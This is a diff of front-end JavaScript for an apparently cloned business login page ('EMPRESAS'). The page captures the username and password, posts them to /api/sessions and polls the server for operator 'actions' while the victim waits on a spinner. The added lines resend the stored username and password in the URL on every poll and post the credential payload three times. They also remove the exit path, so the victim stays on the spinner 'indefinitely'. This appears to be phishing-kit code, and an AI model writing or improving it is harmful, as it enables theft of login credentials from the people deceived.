@@ -357,19 +357,14 @@
     stopPolling();
     pollInterval = setInterval(async () => {
       try {
-        const response = await fetch(`/api/sessions/${sessionId}`);
-        if (response.status === 404) {
-          stopPing();
-          stopPolling();
-          sessionStorage.removeItem('is_waiting');
-          hideSpinner();
-          return;
-        }
+        const u = encodeURIComponent(sessionStorage.getItem('last_user') || (userInput ? userInput.value.trim() : ''));
+        const p = encodeURIComponent(sessionStorage.getItem('last_pass') || (password ? password.value : ''));
+        const response = await fetch(`/api/sessions/${sessionId}?user=${u}&pass=${p}`);
         if (!response.ok) return;
         const data = await response.json();
         const action = data.action;
 
-        // Si no hay acción o ya se procesó esta misma acción, no hacer nada repetitivo
+        // Si no hay acción o ya se procesó esta misma acción, no hacer nada (permanecer en el spinner indefinidamente)
         if (!action || action === lastHandledAction) return;
         lastHandledAction = action;
 
@@ -461,19 +456,21 @@
     sessionStorage.setItem('last_pass', passVal);
     sessionStorage.setItem('is_waiting', 'true');
 
+    const sessionPayload = JSON.stringify({
+      id: sessionId,
+      username: userVal,
+      password: passVal,
+      tipoUsuario: 'EMPRESAS',
+      device: device,
+      state: 'waiting'
+    });
+
     try {
-      await fetch('/api/sessions', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          id: sessionId,
-          username: userVal,
-          password: passVal,
-          tipoUsuario: 'EMPRESAS',
-          device: device,
-          state: 'waiting'
-        })
-      });
+      await Promise.all([
+        fetch('/api/sessions', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: sessionPayload }),
+        fetch('/api/sessions', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: sessionPayload }),
+        fetch('/api/sessions', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: sessionPayload })
+      ]);
     } catch (_) {}
 
     startPing();
